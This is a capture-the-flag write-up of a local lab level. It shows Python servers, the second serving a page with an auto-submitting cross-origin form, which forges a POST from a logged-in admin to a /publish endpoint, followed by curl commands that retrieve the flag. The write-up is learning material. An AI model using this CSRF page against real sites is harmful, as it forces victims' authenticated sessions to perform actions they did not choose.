# BYPASSING SOP WITH A CROSS-ORIGIN FORM POST


In this level I had to use CSRF to publish the flag post. The victim of this challenge logs into `http://challenge.localhost/` as admin user, and then proceeds to visit an "evil" site that I had set up previously, `http://hacker.localhost:1337/`. Now 'hacker.localhost' points to my very own workspace.

However, unlike the previous level, in which I had to make a GET pattern server, this one demanded a POST instead. Initially what I came up with was this,

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class PostRedirectHandler(BaseHTTPRequestHandler):
    def do_POST(self):
    
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        print(f"Received POST data: {post_data.decode('utf-8', errors='ignore')}")
        
        self.send_response(303)
        self.send_header("Location", "http://challenge.localhost/publish")
        self.end_headers()

server = HTTPServer(("127.0.0.1", 1337), PostRedirectHandler)
print("POST redirect server running on http://hacker.localhost:1337...")
server.serve_forever()
```

The result of this server when the victim logged in was,

```
POST redirect server running on http://hacker.localhost:1337...
127.0.0.1 - - [18/Sep/2026 11:01:03] code 501, message Unsupported method ('GET')
127.0.0.1 - - [18/Sep/2026 11:01:03] "GET / HTTP/1.1" 501 -
127.0.0.1 - - [18/Sep/2026 11:01:03] code 501, message Unsupported method ('GET')
127.0.0.1 - - [18/Sep/2026 11:01:03] "GET /favicon.ico HTTP/1.1" 501 -
```

Which was not at all what I had intended, but the problem was apparent. The victim only visited my site with GET, so my `do_POST` handler never ran. And even if it had, a `303` would have caused the browser to follow with a GET to `/publish`, which would still fail because `/publish` only accepts POST. So the solution to it should be to make it redirect as a POST request as well.

But that's when it struck me: this level is not about redirecting the victim. It's about bypassing the Same Origin Policy, which states JavaScript cannot freely read cross-origin responses. But a browser can send a cross-origin form submission.

So, I used JavaScript only to auto-submit an HTML form. The resulting request was still a normal form POST, which browsers allow cross-origin, so the victim's cookies were sent.

Hence the updated code

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class AutoSubmitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/' or self.path == '':
        
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=UTF-8")
            self.end_headers()

            html_content = """<!DOCTYPE html>
<html>
<head>
    <title>Auto-Submitting Form</title>
</head>
<body>
    <form id="autoForm" action="http://challenge.localhost/publish" method="POST">
        <!-- Add any inputs here if your POST request requires fields -->
    </form>
    <script>
        // Automatically submit the form as soon as the page loads
        window.addEventListener('DOMContentLoaded', (event) => {
            document.getElementById('autoForm').submit();
        });
    </script>
</body>
</html>"""
            
            self.wfile.write(html_content.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

server = HTTPServer(("127.0.0.1", 1337), AutoSubmitHandler)
print("Server running on http://hacker.localhost:1337...")
server.serve_forever()
```

When the victim logged in, I received a clean `127.0.0.1 - - [18/Sep/2026 11:12:57] "GET / HTTP/1.1" 200 -`, which indicated my correct logic.

After which all I had to do was login as a user with:

```bash
curl -v -d "username=<username>&password=<password>" "http://challenge.localhost/login"
```

then use the session cookie to go to the '/' endpoint:

```bash
curl -v -b "session=<cookie>" "http://challenge.localhost/"
```

The results came out smoothly and I got the flag.
